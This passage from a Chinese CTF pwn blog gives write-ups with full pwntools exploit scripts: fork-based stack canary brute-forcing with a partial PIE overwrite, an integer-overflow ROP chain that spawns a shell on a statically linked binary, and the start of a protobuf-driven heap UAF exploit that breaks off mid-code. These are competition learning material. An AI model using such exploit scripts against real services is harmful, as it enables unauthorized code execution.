f12查看一下字符串 看看是否有可疑的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312255579.png" title="image-20230531225508553" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305312255579.png" alt="image-20230531225508553"></a></p><p>看变量名大概可以猜出来  actionid 代表了要操作的函数索引 msgidx是chunk索引 msgsize是malloc的大小 content则是内容</p><p>至于Devicemsg则是包名  刚才也说了 不区分大小写的 唯一要注意的是 proto的编写也可以不要包名 但是这个我就没研究过了 感兴趣的自己看吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">package Devicemsg;</span><br><span class="line"></span><br><span class="line">message pwn &#123;</span><br><span class="line">    optional int64 actionid = 1;</span><br><span class="line">    optional int64 msgidx = 2;</span><br><span class="line">    optional int64 msgsize = 3;</span><br><span class="line">    optional bytes msgcontent = 4;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc --python_out=./ ./pwn.proto</span><br></pre></td></tr></table></figure><p>编写好proto文件后 生成py文件</p><p>import导入exp 最后按照如下编写即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctf_pb2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;123.57.248.214&quot;</span>,<span class="number">16952</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    chunk = pwn()</span><br><span class="line">    chunk.actionid = <span class="number">2</span></span><br><span class="line">    chunk.msgidx = index*<span class="number">2</span></span><br><span class="line">    chunk.msgsize = size+<span class="number">0x10</span></span><br><span class="line">    chunk.msgcontent = content</span><br><span class="line">    io.send(chunk.SerializeToString())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pwn()是根据你proto中的message名称</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fork爆破canary</title>
      <link href="/2023/05/28/fork%E7%88%86%E7%A0%B4canary/"/>
      <url>/2023/05/28/fork%E7%88%86%E7%A0%B4canary/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种强行泄露出canary的办法 不是很喜欢这类题目 主要是爆破canary的时间比较久 如果后面的脚本有问题 就得重新跑 比较烦人</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理主要来关注一下fork函数</p><p>fork函数利用系统调用创建了一个子进程 这个子进程的终止与否都不会影响到父进程 系统会给子进程分配代码空间和存储数据 大部分和父进程是一样的</p><p>关键的canary也和父进程是一样的 由于子进程的终止不会影响到父进程 所以 如果子进程由于canary不对而触发__stack_chk_fali函数</p><p>子进程自己是终止了 但是父进程依然存在 所以可以利用这一点逐个字节爆破canary 如果最后不报错 就说明canary爆破成功 就可以进行栈溢出了</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="Ciscn2023-funcanary"><a href="#Ciscn2023-funcanary" class="headerlink" title="Ciscn2023 funcanary"></a>Ciscn2023 funcanary</h3><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305282200003.png" title="image-20230528220031922" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305282200003.png" alt="image-20230528220031922"></a></p><p>保护机制全开 64位</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1243(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">      sub_128A();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;have fun&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>while嵌套了主要的逻辑 每次都fork出一个子进程 随后进入sub_128A执行操作 跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_128A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拥有栈溢出的机会 同时还有一个后门函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1228</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就是利用fork函数爆破出canary 随后就是栈溢出劫持程序执行流 但是由于开启了pie 所以还得再爆破一位 才能进入后门函数</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;39.105.26.155&quot;</span>,<span class="number">38646</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome&quot;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line"></span><br><span class="line">        io.send(cyclic(<span class="number">0x68</span>) + canary +  i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        a = io.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;have fun&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">            canary += i.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x02&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x12&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x22&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x32&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x42&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x52&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x62&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x72&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x82&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\x92&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xa2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xb2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xc2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xd2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xe2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+canary+cyclic(<span class="number">0x8</span>)+<span class="string">b&#x27;\x28\xf2&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023Ciscn初赛</title>
      <link href="/2023/05/28/2023Ciscn/"/>
      <url>/2023/05/28/2023Ciscn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>收获满满的一次比赛 </p><p>wp就用赛后提交的吧  涉及到重要的知识点都会开新专栏介绍的</p><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>在购买物品时 对于数量的判断不严格 存在整数溢出漏洞 输入负数个物品 最后的金额反而会增加 随后直接提供了栈溢出的机会 静态编译的题目 可以直接ROPgadget –binary pwn –ropchain获取一段rop链 getshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;123.56.116.45&quot;</span>,<span class="number">26836</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/test/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;3. 勇闯天涯&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;来几瓶？&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-20000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;烧烤摊儿已归你所有，请赐名：&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">p += pack( <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack( <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack( <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack( <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack( <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack( <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack( <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack( <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack( <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack( <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack( <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack( <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack( <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack( <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack( <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack( <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack( <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401FAE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(p)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>2.31的一道堆题 但是菜单传参部分是用protobuf来的 先分解出proto文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc -I=./ --python_out=./ ctf.proto</span><br></pre></td></tr></table></figure><p>再得到ctf_pb2.py文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">package Devicemsg;</span><br><span class="line"></span><br><span class="line">message pwn &#123;</span><br><span class="line">    optional int64 actionid = 1;</span><br><span class="line">    optional int64 msgidx = 2;</span><br><span class="line">    optional int64 msgsize = 3;</span><br><span class="line">    optional bytes msgcontent = 4;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>最后import导入 就可以菜单交互了</p><p>总体的思路就是利用UAF 来double free 不过没有选择tcachebin attack</p><p>貌似edit的时候会破坏原本的堆结构 在tcachebin attack的时候一直没法double free 最后放到fastbin里打任意写了</p><p>因为开了沙盒 所以最后是用setcontext的办法来构造orw</p><p>但是chunk的大小不够放 所以最后是把把orw改成了单次read 动调查看了执行完read的rsp指针 往那个地址读入rop链就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctf_pb2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;123.57.248.214&quot;</span>,<span class="number">16952</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    chunk = pwn()</span><br><span class="line">    chunk.actionid = <span class="number">2</span></span><br><span class="line">    chunk.msgidx = index*<span class="number">2</span></span><br><span class="line">    chunk.msgsize = size+<span class="number">0x10</span></span><br><span class="line">    chunk.msgcontent = content</span><br><span class="line">    io.send(chunk.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    chunk = pwn()</span><br><span class="line">    chunk.actionid = <span class="number">4</span></span><br><span class="line">    chunk.msgidx = index*<span class="number">2</span></span><br><span class="line">    chunk.msgsize = size+<span class="number">0x10</span></span><br><span class="line">    chunk.msgcontent = content</span><br><span class="line">    io.send(chunk.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    chunk = pwn()</span><br><span class="line">    chunk.actionid = <span class="number">6</span></span><br><span class="line">    chunk.msgidx = index*<span class="number">2</span></span><br><span class="line">    chunk.msgsize = <span class="number">0</span></span><br><span class="line">    chunk.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    io.send(chunk.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io.recvuntil(<span class="string">&quot;You can try to have friendly communication with me now: &quot;</span>)</span><br><span class="line">    chunk = pwn()</span><br><span class="line">    chunk.actionid = <span class="number">8</span></span><br><span class="line">    chunk.msgidx = index*<span class="number">2</span></span><br><span class="line">    chunk.msgsize = <span class="number">32</span></span><br><span class="line">    chunk.msgcontent = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    io.send(chunk.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span 